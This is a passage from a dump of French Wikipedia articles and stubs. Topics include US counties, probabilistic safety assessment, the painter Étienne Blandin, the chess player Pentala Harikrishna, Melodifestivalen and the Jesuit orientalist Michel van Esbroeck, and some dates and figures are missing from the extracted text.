Il est ensuite recruté en 2001 par l'université de Rider afin de compléter les rangs des Broncos qui évoluent au sein de la Metro Atlantic Athletic Conference (NCAA I).

</doc>
<doc id="2845748" url="https://fr.wikipedia.org/wiki?curid=2845748" title="BFO">
BFO

BFO est un code qui peut signifier :
BFO est un sigle qui peut désigner :

</doc>
<doc id="2845749" url="https://fr.wikipedia.org/wiki?curid=2845749" title="Bfo">
Bfo



</doc>
<doc id="2845752" url="https://fr.wikipedia.org/wiki?curid=2845752" title="Beaver County">
Beaver County



</doc>
<doc id="2845754" url="https://fr.wikipedia.org/wiki?curid=2845754" title="Comté de Pontotoc (Mississippi)">
Comté de Pontotoc (Mississippi)

Le comté de Pontotoc est un comté situé dans l'État du Mississippi aux États-Unis. Le siège du comté est Pontotoc. Selon le recensement de 2000, sa population est de habitants.

</doc>
<doc id="2845756" url="https://fr.wikipedia.org/wiki?curid=2845756" title="Le parc national de Phu Kradung">
Le parc national de Phu Kradung



</doc>
<doc id="2845759" url="https://fr.wikipedia.org/wiki?curid=2845759" title="Industrie du textile">
Industrie du textile



</doc>
<doc id="2845760" url="https://fr.wikipedia.org/wiki?curid=2845760" title="Falls">
Falls

Falls peut faire référence à :

</doc>
<doc id="2845765" url="https://fr.wikipedia.org/wiki?curid=2845765" title="Nouvelle Galles-du-sud">
Nouvelle Galles-du-sud



</doc>
<doc id="2845766" url="https://fr.wikipedia.org/wiki?curid=2845766" title="WAS">
WAS



</doc>
<doc id="2845776" url="https://fr.wikipedia.org/wiki?curid=2845776" title="Étude probabiliste de sûreté">
Étude probabiliste de sûreté

Les Études probabilistes de sûreté (EPS) (en anglais : "" ou PSA) sont des méthodes d’évaluation des risques fondée sur une investigation systématique des scénarios accidentels. Elles se composent d’un ensemble d’analyses techniques permettant d’apprécier les risques liés à un système industriel complexe sur le plan de la fréquence des événements redoutés et de leurs conséquences.
Les EPS sont utilisées dans le domaine du nucléaire. La plupart des autres industries (aéronautique, chimique, automobile, construction, transport, finance ...) utilisent des méthodes similaires, mais sous d'autres appellations (étude probabiliste de sécurité, évaluation probabiliste des risques, ...). En effet, en dehors du secteur du nucléaire, la "sûreté "se réfère aux actes de malveillance tandis que la "sécurité "se réfère aux évènements accidentels.
Cette méthode a été utilisée pour vérifier la sûreté des centrales nucléaires, qui repose sur une conception déterministe (Défense en profondeur). Ensuite son utilisation a été étendue à la conception de nouvelles centrales. 
On distingue trois types d'EPS, selon les conséquences étudiées :
- EPS de niveau 1 : elle permet d'identifier les séquences menant à la fusion du cœur et
quantifie leurs fréquences,
- EPS de niveau 2 : permet d’évaluer la nature, l’importance et les fréquences des
rejets hors de l’enceinte de confinement,
- EPS de niveau 3 : permet d’évaluer les fréquences calculées de conséquences
exprimées en termes dosimétriques ou en termes de contamination (voire en termes de
fréquences de cancers ou d’autres effets sur la santé).

</doc>
<doc id="2845777" url="https://fr.wikipedia.org/wiki?curid=2845777" title="Central park">
Central park



</doc>
<doc id="2845778" url="https://fr.wikipedia.org/wiki?curid=2845778" title="Bfp">
Bfp



</doc>
<doc id="2845780" url="https://fr.wikipedia.org/wiki?curid=2845780" title="Comté de Seminole (Oklahoma)">
Comté de Seminole (Oklahoma)

Le comté de Seminole est un comté situé dans l'État de l'Oklahoma, aux États-Unis. Le siège du comté est Wewoka. Selon le recensement de 2000, sa population est de habitants.

</doc>
<doc id="2845781" url="https://fr.wikipedia.org/wiki?curid=2845781" title="BFP">
BFP

BFP peut faire référence à :

</doc>
<doc id="2845790" url="https://fr.wikipedia.org/wiki?curid=2845790" title="Youssef Belkebla">
Youssef Belkebla

Youssef Belkebla né le à Aubervilliers est un footballeur franco-algérien, évoluant au poste d'attaquant. 
Il est le frère de la comédienne Fadila Belkebla, vue au cinéma dans "Les Tuche" d'Olivier Baroux (2011) et dans la série "Boulevard du Palais" sur France 2.
Reconversion.
Dirigeant.
Aujourd'hui, Youssef Belkebla est vice-président du FCM Aubervilliers.
Famille.
Youssef est le frère de Kamel Belkebla (actuellement entraîneur-adjoint de l'équipe de Division d'Honneur), de Karim Belkebla (directeur sportif du club FCM Aubervilliers) et de Zizek Belkebla ex footballeur professionnel et acteur (vu au cinéma dans Viva L'Adjérie de Nadir Moknèche en 2004, et à la télévision dans Plus belle la vie en 2007 sur France 3).Il est l'oncle du footballeur Haris Belkebla.

</doc>
<doc id="2845791" url="https://fr.wikipedia.org/wiki?curid=2845791" title="Lesly Bengaber">
Lesly Bengaber

Lesly Bengaber, né le à Les Abymes, est un joueur de basket-ball professionnel français. Il mesure 1,96 m.
Palmarès.
 Champion de la Guadeloupe u15(coach)
Coach u11

</doc>
<doc id="2845795" url="https://fr.wikipedia.org/wiki?curid=2845795" title="The pale brothers">
The pale brothers



</doc>
<doc id="2845796" url="https://fr.wikipedia.org/wiki?curid=2845796" title="Comté de Seminole (Géorgie)">
Comté de Seminole (Géorgie)

Le comté de Seminole est un comté situé au sud-ouest de l'État de Géorgie aux États-Unis. Le siège du comté est Donalsonville. Selon le recensement de 2000, sa population est de habitants. Le comté a été fondé en 1920 et doit son nom à la tribu amérindienne des Séminoles.

</doc>
<doc id="2845798" url="https://fr.wikipedia.org/wiki?curid=2845798" title="Pentala Harikrishna">
Pentala Harikrishna

Pentala Harikrishna (né le dans l'état d'Andhra Pradesh en Inde) est un grand maître indien du jeu d'échecs.
Un des plus forts joueurs de son pays, après Viswanathan Anand, Harikrishna est devenu le plus jeune grand maître indien en 2001, à quinze ans, un record amélioré depuis par Praggnanandhaa et Gukesh D.
Il a remporté le championnat du Commonwealth en 2001, le championnat du monde junior en novembre 2004 et le championnat d'Asie individuel en 2011.
Au , il est le mondial et le indien avec un classement Elo de . Son record personnel de a été obtenu en . En , il était classé dixième joueur mondial.
Championnats du monde FIDE et coupes du monde.
Harkikrishna a participé deux fois aux championnats du monde organisés par la FIDE (en 2001 et 2004).
Il a participé également à la Coupe du monde d'échecs en 2002 (cinquième du tournoi préliminaire groupe D).
Compétitions par équipe.
Harikishna a participé trois fois au championnat du monde par équipes :
En 2014, il remporta la médaille d'argent au troisième échiquier lors de la coupe d'Europe des clubs d'échecs et son équipe de Nový Bor finit deuxième de la compétition.
En 2016, il réalisa une performance de au premier échiquier de l'Inde lors de l'Olympiade d'échecs et l'équipe d'Inde finit quatrième de la compétition.
Il joue encore au deuxième échiquier de l'équipe indienne en 2018 puis au premier échiquier en 2022.
En 2024, Harikrishna fait partie (en tant que réserviste) de l'équipe qui remporte la médaille d'or à l'Olympiade. Il score 2,5/3 à cette occasion.

</doc>
<doc id="2845801" url="https://fr.wikipedia.org/wiki?curid=2845801" title="Étienne Blandin">
Étienne Blandin

Étienne Jean Marie Blandin né à Saint-Broladre (Ille-et-Vilaine) le et mort à Saint-Malo (Ille-et-Vilaine) le est un peintre français.
Biographie.
Fils d'Étienne Jean Arsène Blandin (1873-1960), marin ayant fait carrière dans l'administration maritime à Saint-Servan, et de mademoiselle Louise Moubèche son épouse, Étienne Blandin est né au domicile de ses grands-parents maternels, Jean et Louise Cécile Moubèche, à Saint-Broladre, dans le pays de Saint-Malo. La famille Blandin, implantée à Cancale, comprenait de nombreux marins. Le grand-père du peintre Étienne Louis Ange Blandin (1837-1887), engagé dans la marine militaire, termina au grade de Premier Maître de Manœuvre de Classe une carrière marquée par des actions courageuses.
À partir de 10-11 ans, le jeune Étienne Blandin, voulait être marin et peignait à l'aquarelle des vues de navires, notamment engagés dans la Grande Guerre. Étienne Blandin commença ses études secondaires à l'Institution de Saint-Malo. En 1919, il intègre le collège Saint-Charles de Saint-Brieuc, aujourd'hui également lycée et collège, en classe préparatoire à la navigation dite " Cours de Flotte". Il est là à la suite de son futur collègue Marin-Marie, interne de 1914 à 1918. Il a alors pour professeur de dessin le peintre Émile Daubé (1885-1961). En , il entre à l'École nationale de navigation maritime de Saint-Malo, mais son niveau en mathématiques n'est pas suffisant. Son père lui conseille de s'orienter vers un métier artistique plus conforme à ses aptitudes. Il entre à l'école régionale des beaux-arts de Rennes le , et y étudie jusqu'en 1924, dans l'atelier de Jules Ronsin (1867-1937), directeur de l'école. En 1924-1925, il étudie à l'École des beaux-arts de Paris, dans l'atelier de Jean-Pierre Laurens En 1923, il entame la rédaction d'un catalogue de ses œuvres dans lequel il les inscrira avec divers renseignements (technique, dimensions, présentation dans des expositions, acheteurs éventuels…) durant 60 ans. A Paris, il prépare les concours au professorat de dessin. Son camarade Louis Dideron (1901-1980), qui deviendra membre de l'Académie des beaux-arts, sculpte son buste. En juin 1925, il devient professeur agrégé de dessin. Il se marie en avec Gabrielle Larère (1908-2009). Les parents de Gabrielle Larère avaient fait l'acquisition de la villa des Tilleuls au 5 (aujourd'hui le 7), boulevard Douville à Saint-Servan. Le peintre habita à cette adresse à partir de 1929 et y installa son atelier et son laboratoire photographique. Il enseigne d'abord à Gap en octobre 1926, puis à Évreux (1927-1929) avant d'être nommé à la rentrée de 1929 au collège de Saint-Servan. Il y comptera parmi ses élèves notamment Geoffroy Dauvergne (1922-1977), et Michel Laclotte (1929-2021), futur directeur du musée du Louvre.
Entre 1927 et 1931, il peint 68 huiles sur toile, treize étant consacrées à la montagne, dont les "Grandes Cimes". Pendant cette même période, il peint des tableaux d'art sacré : "Moïse", "Suzanne et les vieillards" en 1927, puis "Salomé" et "David vainqueur", en 1928. Il peint ensuite des nature-morte comme un "Pichet", toile qu'il expose au Salon de la Société nationale des beaux-arts en 1930. Mais, au début de 1931, il jugea son oeuvre impersonnelle et il décida de ne plus peindre. En revanche, il se mit à étudier l'histoire maritime, en particulier l'évolution des bateaux, de leurs structures et gréements, et de leur manoeuvre. Il ouvrit un nouveau catalogue ayant pour titre "Marines", avec plus de 200 portraits de navires dessinés au crayon, puis à la plume. Fin 1932, début 1933, il reprend ses pinceaux et peint à la gouache des voiliers de différentes époques, s'inscrivant dans le sillage de François Geoffroi Roux (1811-1882).
En , Étienne Blandin présente une exposition "marine à voiles", à Brest. L'amiral Darlan apprécie sa peinture et lui conseille de poser sa candidature au titre de peintre de la Marine où il est nommé par décret du . Il participe à la campagne de l'École de pilotage le long des côtes bretonnes en 1934-1935 à bord de l'aviso "Ancre", dont il tire trois aquarelles. Sa qualité d'enseignant l'oblige à ne naviguer que pendant les périodes de vacances scolaires et il sera de toutes les campagnes d'été de l'École navale de 1935 à 1939. Il embarque chaque année sur le contre-torpilleur "Chacal", lequel est accompagné par le "Léopard", sur lequel il fera la campagne de 1939, et le "Bison".
En , il expose une série de toiles maritimes à Brest dont une grande toile, "Saint-Malo, cité corsaire". Les ports peints par l'artiste sont en majorité ceux qu'il a visités à bord des contre-torpilleurs annexes de l'École navale dont les destinations étaient le Royaume-Uni, la Belgique, Les Pays-Bas, les pays scandinaves et baltes. À bord, il remplit des carnets de croquis et emporte également des supports en carton mesurant sur lesquels il peint au couteau. Il constitue ainsi un album de voyage qui se termine en Norvège le . Au printemps de 1939, il peint cinq marines de grandes dimensions pour la décoration de la grande salle de l'hôtel "Victoria" à Saint-Servan, dont une représente le "Pourquoi Pas" du Commandant Charcot au mouillage en Antarctique.
Dès le , il écrit au Chef du Service Historique de la Marine pour demander à servir à la mer. Il lui est répondu que rien n'est prévu pour les Peintres de la Marine, mais qu'il est libre de s'engager. Réformé définitif en 1926 pour malformation cardiaque, il obtient de passer devant le Conseil de Réforme de Rennes qui le déclare bon pour le service armé le . Il est incorporé en dans un groupe d'instruction de l'infanterie à Saint-Brieuc et sera démobilisé après l'armistice. Il reprend son activité artistique et son poste de professeur au collège de Saint-Servan. Il est renouvelé en tant que peintre de la Marine en 1942, comme ses collègues Marin-Marie, Albert Brenet, et Roger Chapelet.
En 1945, il obtient un congé d'un an pour convenance personnelle. À la rentrée de 1946 il est nommé au lycée d'Angers. En 1948 il contracte la tuberculose. Soigné à Osseja dans les Pyrénées-Orientales de 1948 à 1949 et rentre à Saint-Servan en convalescence pour deux ans. Il profite de ce temps libre pour réaliser un atlas de tous les pavillons de marines connus du monde entier, dessinés à la plume, colorés à la gouache et légendés à la main, soit plus de 1000 planches représentant plus de 3000 pavillons différents. En 1950, il est sollicité par l'Amicale des Capitaines au Long Cours Cap-horniers pour en illustrer le Livre d'Or. Il est élu membre d'honneur de l'Amicale en 1951 et a participé à la création du musée international du Long-Cours Cap-Hornier.
En 1951, il est nommé à Guingamp, puis de nouveau à Saint-Servan en 1955 où il enseigne jusqu'à sa retraite en 1963. De 1958 à 1964, il enseigne tous les ans l'histoire de la navigation à l'École d'administration maritime, sise au Port de Solidor à Saint-Servan. De 1951 à 1963 il a une production importante puisqu'il enregistre à son catalogue plus de 1000 entrées. En retraite, il reste très actif pendant encore une vingtaine d'années, réalisant plus de 400 marines, dont plus de 350 à l'huile, les autres au lavis ou à la plume. Sa vue se détériore et il pose ses pinceaux définitivement en 1983. Mais auparavant, en 1980, il aura eu le privilège d'être le seul peintre français à voir son nom figurer de son vivant dans le "Dictionary of Sea Painters " de Edward H.H. Archibald, Curator of Oils Paintings au National Maritime Museum de Greenwich
En juin 1990, Étienne Blandin participe à l'exposition " Peintres de Marines et autres poètes de la mer", à l'École nationale de la marine marchande de Saint-Malo. Ce sera sa dernière exposition auprès du public.
Le public de sa région le connaît surtout au travers de ses portraits de corsaires aux mines patibulaires et caricaturales, reproduites sur de très nombreuses cartes postales vendues à Saint-Malo.
Il meurt le . Ses obsèques ont eu lieu en l'église Sainte-Croix de Saint-Malo (Saint-Servan) et son inhumation au cimetière marin du Rosais, en bordure de l'estuaire de la Rance.
À l'occasion d’une exposition rétrospective organisée en 2019 par la ville de Saint-Malo, ses fils et petit-fils Patrick Blandin et Jérôme Loyer lui ont consacré un ouvrage, "Étienne Blandin, peintre de la Marine", préfacé par le Contre-amiral Alain Regard, ancien Président de l'Association des Amis du Musée national de la Marine, avec une postface de Michel Laclotte, ancien directeur du musée du Louvre, qui fut élève du peintre au collège de Saint-Servan. Cet ouvrage a été honoré par le Prix Beau Livre 2021 de l'Académie de Marine. Au cours de cette exposition furent présentées plus de 150 œuvres depuis ses dessins de jeunesse jusqu'à ses derniers tableaux.
Éditions de "Têtes de corsaires" en cartes postales.
Une série de a été reproduite en cartes postales, avec le nom, le surnom, la fonction et le navire sur lequel naviguaient les personnages.
Ses cartes postales de caricatures de corsaires sont connues de Dunkerque à Biarritz.
Hommages.
La ville de Saint-Malo a donné son nom à une rue du quartier de Château-Malo.

</doc>
<doc id="2845810" url="https://fr.wikipedia.org/wiki?curid=2845810" title="Pendyala Harikrishna">
Pendyala Harikrishna



</doc>
<doc id="2845811" url="https://fr.wikipedia.org/wiki?curid=2845811" title="Melodifestivalen">
Melodifestivalen

Le (littéralement : « le festival de la chanson ») est une émission musicale organisée par la Sveriges Television (SVT) qui détermine quel artiste ou groupe représentera la Suède au Concours Eurovision de la chanson. Ce concours se déroule chaque année depuis 1959.
Depuis sa création, le a permis à la Suède de remporter 7 victoires et de finir 16 fois dans le top 5 au Concours Eurovision de la chanson. Le vainqueur du concours est choisi par un jury depuis sa création. Cependant, depuis 1999, les jurés ont été rejoints par les téléspectateurs lors de la désignation du vainqueur, chacun comptant pour 50 %.
En 2002, le festival, qui consistait jusque-là en une seule émission, a vu l'introduction de plusieurs demi-finales. Depuis, le consiste en une tournée de six semaines à travers plusieurs grandes villes de Suède, se terminant chaque année par la grande finale qui se déroule à Stockholm. Depuis l'instauration de ces demi-finales, le concours est devenu l'un des programmes télévisés les plus populaires chaque année en Suède.
Histoire.
La première participation de la Suède au Concours Eurovision de la chanson date de 1958, lors de la troisième édition du concours. Cette année-là, le diffuseur public suédois (SR), procède à une sélection interne pour l'artiste, et choisit d'envoyer la chanteuse Alice Babs à Hilversum pour le concours. La chanson est elle sélectionné par un concours remporté par Åke Gerhard et sa chanson ', qui fut après sa sélection en partie réécrite et renommée en '. Pour sa toute première participation, la Suède termine à la du Concours Eurovision de la chanson 1958.
L'année suivante voit la première apparition du , qui se déroule le au Cirkus de Stockholm. Pour cette première édition, huit chansons sont en lice pour représenter la Suède à l'Eurovision 1959, et quatre jurys venant des villes de Stockholm, Göteborg, Luleå et Malmö ont désigné le vainqueur. Le concours fut remporté par Siw Malmkvist avec sa chanson ". Cependant, à cause des problèmes occasionnés par la sélection tardive d'Alice Babs l'année précédente, la SR décide de sélectionner la chanteuse Brita Borg pour l'Eurovision avant même la finale du . La chanteuse Sim Malmkvist sera tout de même récompensée, en étant sélectionnée selon la même méthode pour l'Eurovision 1960.
En 1964, une grève des artistes organisée par le , syndicat suédois des professionnels des arts du spectacle, est lancée. Cette grève empêchera la tenue du , et de ce fait, la participation du pays à l'Eurovision 1964.
En 1965, afin de mettre l'accent sur la chanson plutôt que sur l'artiste, le chanteur Ingvar Wixell est sélectionné en interne et interprète lors du Melodifestivalen 6 chansons différentes. La sélection est remportée par la chanson ', qui sera traduite en anglais pour l'Eurovision et rebaptisée '. La chanson terminera à la place du concours.
En 1970, le concours est annulé en raison du retrait de la Suède de l'Eurovision afin de protester contre la quadruple victoire à l'issue de l'édition 1969, le pays retourne au concours l'année suivante.En 1974, le voit la victoire du groupe ABBA avec la chanson "". Interprétée en suédois pendant la sélection nationale, la chanson est traduite en anglais pour l'Eurovision. Le , le groupe remporte l'Eurovision, évènement qui marquera le début de leur carrière internationale. C'est alors la première victoire du pays au concours.
En 1976, après l'annonce par la SR qu'elle ne pourrait pas se permettre financièrement d'accueillir le concours si jamais la Suède gagnait à nouveau, le Melodifestivalen est annulé après la protestation de plusieurs groupes politiques de gauche, et le pays se retire de l'Eurovision 1976.
En 1980, l'organisation du Melodifestivalen est transférée de la SR à la nouvellement créée (SVT), qui se charge alors également de la participation du pays à l'Eurovision.
Entre 1981 et 1998, un système de deux manches fut introduit lors de la finale dans laquelle cinq finalistes sont éliminés de la compétition.
En 2002, le concours, qui consistait jusqu'alors en une seule soirée, voit l'introduction de plusieurs demi-finales. Le nombre de participants du concours augmente alors de 12 à 32 artistes ou groupes, et une tournée est lancée à travers la Suède. La finale, elle, se déroule à la Strawberry Arena de Stockholm depuis 2013.
Participants.
Depuis sa création, plusieurs centaines d'artistes ont participé au . 
Un certain nombre de participants du festival se sont fait connaître en participants d'autres émissions musicales connus dans le pays. Le programme "", version suédoise de la Nouvelle Star, a notamment accueilli de nombreux futurs participants du dont Loreen, gagnante du et de l'Eurovision 2012 et 2023, et Måns Zelmerlöw, gagnant du puis de l'Eurovision 2015.
Certains participants devenus aujourd'hui célèbre ont établis leur popularité auprès la population suédoise après plusieurs participations au , tel le groupe ABBA qui participe au festival avec la chanson ' en 1973, et qui gagneront la sélection ainsi que le Concours de l'Eurovision 1974, avec la chanson '. La chanteuse Carola Häggkvist, très populaire en Suède, a notamment établi sa popularité avec ses trois victoires au Melodifestivalen, en 1983, 1991 et 2006. 
Vainqueurs et représentants à l'Eurovision.
À l'exception de leur première participation en 1958, toutes les chansons ayant représenté la Suède à l'Eurovision ont été sélectionnés par l'intermédiaire du . Les artistes sélectionnés par le biais du concours ont permis à la Suède de remporter l'Eurovision sept fois : en 1974, 1984, 1991, 1999, 2012, 2015 et 2023. La Suède est ainsi le pays le plus titré du concours, à égalité avec l'Irlande. 
"Waterloo", le titre ayant permis au groupe ABBA de remporter l'Eurovision en 1974, a été désigné meilleure chanson du en 2005, lors du gala ', célébrant le cinquantenaire de l'Eurovision. La même année, le morceau a été élu meilleure chanson de l'Eurovision lors de l'émission spéciale '.
La chanteuse Loreen est la seule artiste ayant remporté deux fois l'Eurovision pour la Suède, avec ses victoires avec "Euphoria" en 2012, et "Tattoo" en 2023. C'est également la deuxième personne à obtenir deux victoires au concours (après Johnny Logan et ses victoires en 1980 et 1987), ainsi que la première femme.
Liste des gagnants.
Le tableau ci-dessous liste les chansons gagnantes de toutes les éditions du , ainsi que leur résultat à l'issue du concours Eurovision de la chanson.
Lieux et Dates.
"Précision : les noms des lieux sont en suédois"
Finale : Stockholm (depuis 2002).
Depuis l'introduction des demi-finales en 2002, toutes les finales du se déroulent dans la capitale suédoise. C'est tout d'abord le Globen de Stockholm, d'une capacité de près de , qui est choisi pour accueillir la finale du concours chaque année, et ce jusqu'en 2012.
En 2013, la de Solna, stade couvert accueillant notamment les matchs de l'équipe nationale de football suédoise, est choisie pour accueillir la finale en raison de sa grande capacité d'accueil. Malgré ses , la répétition générale et la finale ont lieu à guichet fermé, incitant les organisateurs à réutiliser la en 2014. Depuis, la finale s'y déroule tous les ans, exception faite de l'édition 2021, qui se déroule en intégralité à l'Annexet, en raison de la pandémie de Covid-19.
Présentateurs.
Voici la liste des présentateurs par éditions :
Système de vote.
Pour les demi-finales, c'est uniquement le public suédois qui décide du résultat, en votant par téléphone ou en utilisant l'application mobile du , dont les votes sont catégorisés par tranches d'âges.
En finale, le vote se divise en deux parties : La première partie est le résultat des jurys internationaux (anciennement régionaux). Depuis 2018, le même système de points qu'à l'Eurovision est utilisé : les jurés classent leurs 10 chansons préférées en leur attribuant 1, 2, 3, 4, 5, 6, 7, 8, 10 et 12 points, soit un total de 58 points par jury. La deuxième partie du vote est le vote du public, qui se déroule de la manière qu'en demi-finale, par téléphone ou en utilisant l'application mobile du Melodifestivalen.
Le résultat final est la somme obtenue par le vote du jury et par celui des téléspectateurs, qui comptent chacun pour 50 % du résultat final. Le gagnant est le participant ayant obtenu le score le plus élevé, et remporte alors le droit de représenter la Suède au Concours Eurovision de la chanson.
Identité musicale et visuelle.
Style musical.
Le style musical du est varié. On y retrouve principalement de la pop, mais également des ballades, du rock, du schlager, ou bien encore du R&amp;B. Cette diversité se retrouve également dans les gagnants du Melodifestivalen.
Tout comme à l'Eurovision, un orchestre a été utilisé jusqu'en 2000, à l'exception des éditions 1985 et 1986, pour raison d'économie.
Identité visuelle.
L'identité visuelle du est réalisée depuis 2002 par l'agence de création Dallas Sthlm.
Popularité.
Le est un événement majeur chaque année en Suède, et fais désormais partie de la culture populaire du pays. Chaque émission réunit plusieurs millions de personnes chaque semaine. En 2020, il a été estimé qu'une large majorité de suédois avaient regardé au moins une des émissions du festival lors de la dernière édition.
Le concours est notamment couvert médiatiquement par la SVT qui l'organise, mais également par les journaux tabloïd tels que Aftonbladet et Expressen"."

</doc>
<doc id="2845815" url="https://fr.wikipedia.org/wiki?curid=2845815" title="Etude ou évaluation probabiliste de sûreté">
Etude ou évaluation probabiliste de sûreté



</doc>
<doc id="2845821" url="https://fr.wikipedia.org/wiki?curid=2845821" title="Évaluation probabiliste de sûreté">
Évaluation probabiliste de sûreté



</doc>
<doc id="2845859" url="https://fr.wikipedia.org/wiki?curid=2845859" title="Michel van Esbroeck">
Michel van Esbroeck

Michel van Esbroeck, né le à Malines (Belgique) et mort le à Louvain-la-Neuve (Belgique), est un prêtre, jésuite, bollandiste et orientaliste belge.
Biographie.
Jeunesse et formation.
Né dans une famille bourgeoise de Malines, Michel van Esbroeck est de double ascendance, flamande et wallonne. Cependant, le français était sa langue maternelle. L’anglais était aussi parlé en famille et l’ouverture culturelle faisait partie de l’atmosphère familiale.
Son père, Guillaume van Esbroeck, ingénieur des Mines, géologue diplômé de l’université Columbia et professeur à l’université de Gand, fut notamment expert pour la défense au procès de la catastrophe minière du Bois du Cazier ; passionné de musique, il conçut en 1939 un orgue expérimental, appelé « orthoclavier », comportant 53 demi-tons. 
Michel fut envoyé au Collège Saint-Michel de Bruxelles, et acheva brillamment ses «humanités gréco-latines» en 1951. Il entama alors des études de droit aux Facultés universitaires Saint-Louis de Bruxelles, mais ce n’était pas sa vocation. Le il entra dans la Compagnie de Jésus (Province de Belgique Méridionale). Son initiation spirituelle terminée (Arlon, de 1953 à 1955) il prépara (1955 à 1959) et obtint la licence d’état en philologie classique et la licence ecclésiastique de philosophie à la Faculté (jésuite) de Théologie Saint-Albert de Louvain. Il fit ensuite son service militaire (service des brancardiers, à Alost), puis enseigna un an au Collège Saint-Michel.
Hagiographie, orientalisme chrétien et apprentissage des langues.
C’est en 1962, alors qu'il enseigne au collège Saint-Michel qu'il entra pour la première fois dans la bibliothèque des Bollandistes, située dans une aile du Collège, et se plongea dans les études hagiographiques et patristiques. Cette année-là, il fut autorisé à suivre, à l’université catholique de Louvain, comme auditeur libre, les cours d’arménien et de géorgien du professeur Gérard Garitte, qui venait de publier chez les Bollandistes le "Calendrier palestino-géorgien".
Il prit alors conscience de la complexité des problèmes concernant la littérature hagiographique: le grec, le latin, l’arménien et le géorgien ne pouvaient suffire à maîtriser ces questions. Il fallait nécessairement étudier l’arabe et le syriaque, le copte, le slavon et le ge’ez. Michel part donc pour Beyrouth en 1963, pour étudier l’arabe et le syriaque à l’université Saint-Joseph (en réalité au Centre d’études arabes des jésuites à Bikfaya).
Normalement, il faut un minimum de deux ans pour apprendre les rudiments de l’arabe. Lui, arrive en retard et repart après un an, ayant appris suffisamment les deux langues : il avait emporté avec lui quelques microfilms de manuscrits arabes hagiographiques du Sinaï. Il les projetait sur le papier et copiait le texte en suivant le tracé lumineux, sans connaître encore l’arabe. Ainsi a-t-il appris à écrire, en même temps qu’il avait transcrit des textes (qu’il éditera plus tard), avant même de connaître la langue ! Il utilisa la même méthode pour le syriaque. Mais en 1964 il fut rappelé en Belgique pour commencer ses quatre années d’études théologiques à Louvain. C’est probablement à ce moment qu’il étudie tout seul le copte et le slavon, l’hébreu et le ge’ez.
Ordination sacerdotale.
Normalement, à la fin de la , les jésuites sont ordonnés prêtres, puis font une de théologie (pour obtenir la licence). En 1966, Michel fut informé qu’il ne serait pas ordonné avec ses confrères. Cet épisode laissa une blessure profonde en lui. À la fin de sa vie, il affirmait encore que jamais le motif de cet ajournement ne lui fut expliqué. En fait un aspect 'rebelle' de son tempérament effrayait ses supérieurs jésuites. Il leur demanda alors de pouvoir achever son doctorat en histoire et philologie orientale à l’université de Louvain. C’est seulement en 1970 qu’il put achever sa théologie et fut ordonné prêtre le . Plus tard, le , il prononça ses vœux solennels de jésuite.
Recherche et enseignement.
Ayant obtenu son doctorat en histoire et philologie orientale avec la présentation d'une thèse consacrée aux plus anciens homiliaires géorgiens, van Esbroeck fut officiellement reçu dans la Société des Bollandistes en 1975. Mais il ne se cantonne pas à leur bibliothèque. Il part à la recherche de documents anciens qu’il désire faire sortir de l’oubli. Dès 1976 il passe quatre mois en Union des républiques socialistes soviétiques, visitant les bibliothèques de Moscou, Leningrad (maintenant Saint-Pétersbourg), Tbilissi (Géorgie) et Erevan (Arménie) où il établit de nombreux contacts avec les Académies de sciences. Il en rapporte 150 paquets de livres et revues et quelque photos de manuscrits. Mais de sa visite il dira surtout : « La foi des croyants est ce que j’ai vu de plus beau ». 
À l’Institut pontifical oriental de Rome il enseigne l’histoire de l’Église et les langues arménienne et géorgienne (1979-1990). Enseignement de ces deux langues orientales à l’Institut catholique de Paris également (1984-1986). À l’université de Munich il dispense des cours de philologie orientale chrétienne (1987-1998). Atteint par la limite d’âge il rentre en Belgique en 2002 et s’installe à Louvain-la-Neuve. C’est là qu’il meurt subitement, le , au retour d’un voyage à Rome.
Contributions à l'orientalisme chrétien.
Sa contribution scientifique à l’orientalisme est considérable et assez unique. Ses connaissances balayaient tout le champ des sciences humaines et des sciences religieuses, et sa connaissance des langues (jamais parfaite mais toujours étonnante) lui permettait de percevoir ce que le spécialiste confiné dans une ou deux langues ne pouvait saisir. Le fait de maîtriser tant de langues et tant de domaines, en négligeant un peu certains points, pouvait être, à juste titre, irritant pour le spécialiste. Il n’en reste pas moins qu’il avait le courage de publier des textes que d'autres n’osaient pas.
Ses recherches ont porté presque toujours sur l’hagiographie, mais comprise au sens le plus large possible.
Robbert Godding, directeur de la Société des bollandistes (et disciple de Michel van Esbroeck), écrivait après sa mort : «Dans la tradition bollandienne, qui distingue habituellement trois secteurs de la recherche, confiés à des spécialistes distincts, le latin, le grec et l’oriental, Michel pouvait à lui seul traiter avec compétence tous les aspects d’un dossier. Cette maîtrise l’avait amené à privilégier l’étude de dossiers extrêmement complexes, tels ceux des Apôtres, en particulier S. Barthélemy, de S. Grégoire le Thaumaturge, ou encore les traditions concernant la Vierge Marie». «Mais l’hagiographie elle-même s’avérait pour lui un champ trop exigu. C’est ainsi qu’il s’est intéressé de près à l’exégèse, à la patristique et à l’histoire des conciles. Servi par une mémoire prodigieuse, il était seul à pouvoir opérer certains rapprochements totalement inattendus, à déceler des filiations de textes et des influences qui auraient échappé à tout autre érudit».
Avec François Nau, Anton Baumstark et quelques autres, Michel van Esbroeck est un grand nom de l'orientalisme chrétien.
Publications.
La présente liste comprend les articles de revue et de mélanges, ainsi que trois ouvrages importants (1975, 1982 et 1995), mais non les articles d'encyclopédies. Pour une présentation plus détaillée, on se reportera au mémorial cité ci-dessous.

</doc>
<doc id="2845869" url="https://fr.wikipedia.org/wiki?curid=2845869" title="Le Palais de Sanam Chan">
Le Palais de Sanam Chan



</doc>
<doc id="2845875" url="https://fr.wikipedia.org/wiki?curid=2845875" title="Axel rose">
Axel rose



</doc>
<doc id="2845876" url="https://fr.wikipedia.org/wiki?curid=2845876" title="Liste de villes de la république du Congo">
Liste de villes de la république du Congo

Cet article présente la liste des villes de la république du Congo.

</doc>
<doc id="2845881" url="https://fr.wikipedia.org/wiki?curid=2845881" title="Césarée de Philippe">
Césarée de Philippe



</doc>
<doc id="2845886" url="https://fr.wikipedia.org/wiki?curid=2845886" title="Van Esbroeck">
Van Esbroeck



</doc>
<doc id="2845888" url="https://fr.wikipedia.org/wiki?curid=2845888" title="Smith's Ballpark">
Smith's Ballpark

Le Smith's Ballpark (auparavant "Franklin Quest Field", "Franklin Covey Field" et "Spring Mobile Ballpark") est un stade de baseball situé à Salt Lake City dans l'Utah.
C'est le domicile des Bees de Salt Lake, club de niveau Triple-A évoluant en Ligue de la côte du Pacifique, et des Utes de l'Utah, club de baseball de l'université de l'Utah. Le Smith's Ballpark a une capacité de 14 511 places.

</doc>
